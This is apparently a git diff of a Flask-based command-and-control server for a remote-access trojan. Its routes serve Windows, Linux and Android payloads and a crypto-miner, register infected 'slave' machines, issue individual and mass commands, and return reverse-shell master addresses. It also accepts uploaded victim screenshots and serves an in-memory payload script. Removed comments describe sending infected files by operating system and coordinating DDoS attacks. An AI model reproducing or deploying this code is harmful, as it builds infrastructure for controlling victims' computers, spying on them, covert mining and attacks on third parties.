@@ -1,14 +1,10 @@
-from cv2 import line
 from flask import request, render_template
 from flask import Flask , request, redirect, render_template , sessions, session, url_for, send_from_directory, send_file
 from flask_cors import CORS, cross_origin
 from werkzeug.utils import secure_filename
 from werkzeug.datastructures import  FileStorage
-import flask
 import os
-import sqlite3
 import apext_db
-import nuitka
 from datetime import date
 
 app = Flask(__name__, static_folder='static')
@@ -16,13 +12,15 @@ CORS(app=app, supports_credentials=True)
 app.config['SCREENSHOT_FOLDER'] = "./static/screenshots"
 app.secret_key= os.urandom(24).hex()
 
-_SERVER = "192.168.1.6:3000"
-
-with open("./server_config.cfg", "r") as cfg:
+### READ SERVER_CONFIG.CFG TO GET IP AND PORT ###
+with open("./server.cfg", "r") as cfg:
     ip = '{0}'.format(cfg.readline()[7:].strip())
     port = '{0}'.format(cfg.readline()[5:].strip())
+    
+### needed for eval command from watchdog ###
+_SERVER = "{0}:{1}".format(ip, port)
 
-#   HOME LINK WILL DETECT WHAT OS THE VISITOR IS RUNNING AND SEND INFECTED FILE ACCORDINGLY  #
+### UNFINISHED HTML GUI C&C ###
 @app.route('/admin')
 def mainn():
     rats = []
@@ -31,28 +29,31 @@ def mainn():
         rats.append(rat)
     return render_template("admin.html", rats=rats)
 
-### LINUX PAYLOAD AND WATHCDOG ###
+### LINUX WATHCDOG DOWNLOAD ###
 @app.route('/downloads/linux/watchdog')
 def download_linux_watchdog():
     print(request.user_agent.string)
     return send_file('./static/linux/watchdog', as_attachment=True)
 
+### LINUX PAYLOAD DOWNLOAD ###
 @app.route('/downloads/linux/payload')
 def download_linux_payload():
     print(request.user_agent.string)
     return send_file('./static/linux/payload', as_attachment=True)
 
+### ANDROID PAYLOAD DOWNLOAD ###
 @app.route('/android')
 def download_linzzux_payload():
     print(request.user_agent.string)
     return send_file("./static/linux/zz.apk", as_attachment=True)
 
-### WINDOWS PAYLOAD AND WATCHDOG ###
+### WINDOWS WATCHDOG DOWNLOAD ###
 @app.route('/downloads/windows/watchdog')
 def download_windows_watchdog():
     print(request.user_agent.string)
     return send_file('./static/windows/watchdog.exe', as_attachment=True)
 
+### WINDOWS PAYLOAD DOWNLOAD ###
 @app.route('/downloads/windows/payload')
 def download_windows_payload():
     print(request.user_agent.string)
@@ -64,22 +65,7 @@ def download_linux_phoenixminer():
     print(request.user_agent.string)
     return send_file('./static/linux/PhoenixMiner_5.7b_Linux.zip', as_attachment=True)
 
-@app.route('/downloads/windows/phoenixminer')
-def download_windows_phoenixminer():
-    print(request.user_agent.string)
-    return send_file('./static/linux/payload', as_attachment=True)
-
-@app.route('/downloads/source-code')
-def download_windows_phoenixminerz():
-    print(request.user_agent.string)
-    return send_file('./static/source-code/watchdog.py', as_attachment=True)
-
-@app.route('/downloads/pu')
-def download_windowss_phoenixminerz():
-    print(request.user_agent.string)
-    return send_file('./static/pu.jpeg', as_attachment=True)
-
-###   LINK TO REGISTER SLAVE, SLAVES WILL BE REDIRECTED TO THIS LINK  ###
+### REGISTER LINK, PARAMS IP, USER, OS ###
 @app.route('/register/<ip>/<user>/<os>', methods=['POST', 'GET'])
 def register(ip, user, os):
     if ip == "None":
@@ -93,7 +79,7 @@ def register(ip, user, os):
         print('created users')
         return 'none'
 
-###   LINK TO CHECK IF RAT HAS BEEN REGISTERED, IF NOT IT WILL REDIRECT TO REGISTRATION LINK  ###
+### CHECK IF REGISTERED, PARAMS IP, USERNAME ###
 @app.route('/check_if_registered/<ip>/<user>', methods=['POST', 'GET'])
 def check_if_registered(ip, user):
     print('checking if user is registered alrdy')
@@ -110,7 +96,7 @@ def check_if_registered(ip, user):
     except TypeError:
         return redirect(register(ip, user))
 
-### LINK FOR SLAVE TO CHECK FOR NEXT COMMAND. COMMANDS WILL EMPTY AFTER ATTEMPT, PIPING COMMANDS DO NOT WORK YET  ###
+### CHECK FOR COMMAND LINK ###
 @app.route('/command/<ip>/<user>', methods=['POST', 'GET'])
 def command(ip, user): 
     command = '{0}'.format(apext_db.get_user_command(ip, user))
@@ -118,7 +104,7 @@ def command(ip, user):
     print(command)
     return command
 
-#   IP AND PORT TO DDOS WITH ALL SLAVES #
+### CHECK FOR A MASS COMMAND LINK ###
 @app.route('/mass/<ip>/<user>', methods=['POST', 'GET'])
 def mass_(ip, user): 
     command = '{0}'.format(apext_db.get_user_command(ip, user))
@@ -126,12 +112,14 @@ def mass_(ip, user):
     print(command)
     return command
 
-### IP AND PORT OF THE MASTER TO CONNECT REVERSE SHELL TO  ###
+### REVERSE SHELL, CHECK FOR A SERVER ###
 @app.route('/rshell/<ip>/<user>', methods=['POST', 'GET'])
 def rshell_(ip, user): 
     master_ip = '{0}'.format(apext_db.get_rshell_master(ip, user))
-    return master_ip
+    master_port = '{0}'.format(apext_db.get_rshell_master_port(ip, user))
+    return master_ip + " " + master_port
 
+### GET YOUR IP ###
 @app.route('/getip', methods=['POST', 'GET'])
 def get_ip(): 
     return str(request.remote_addr)
@@ -178,21 +166,17 @@ def information_grabber(key):
 ################################################################
 
 
-### UPLOAD FILES ###
+### USER UPLOAD SCREENSHOT LINK ###
 @app.route('/upload/screenshot/<ip>/<user>', methods=['POST', 'GET'])
 def upload_screenshot(ip, user): 
     if request.method == 'POST':
         try:
-
             if apext_db.check_rat_exists(ip, user) != None:
                 print("screenshot user exists")
                 f = request.files['file']
-                
                 filename = secure_filename(f.filename)
                 f.save(os.path.join(app.config['SCREENSHOT_FOLDER'], filename))
                 return 'ok'
-                
-                
             else:
                 print("no user zzzzzzzzzzzzzzz")
                 return None
@@ -237,6 +221,7 @@ navigator.geolocation.getCurrentPosition((loc) => {
 
 """
 
+### PAYLOAD SCRIPT TO RUN IN MEMORY ###
 @app.route('/remote', methods=['GET'])
 
 def remote():
@@ -348,3 +333,4 @@ while 1:
 """
 
 app.run(host=ip, port=port, threaded=True)
+
